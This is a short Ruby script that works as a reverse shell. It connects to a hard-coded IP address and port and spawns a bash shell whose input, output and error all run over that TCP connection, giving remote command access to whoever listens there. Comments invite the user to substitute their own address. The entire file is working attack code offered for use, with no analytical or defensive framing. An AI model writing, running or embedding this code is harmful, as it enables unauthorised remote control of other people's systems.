#!/usr/bin/env ruby

require 'socket'

# Set your LHOST and LPORT here
LHOST = '107.175.243.19'     # Replace with your IP address
LPORT = 51000		     # Replace with your port number

# Spawn a bash shell and redirect input/output/error to the TCP socket
spawn("bash", [:in, :out, :err] => TCPSocket.new(LHOST, LPORT))
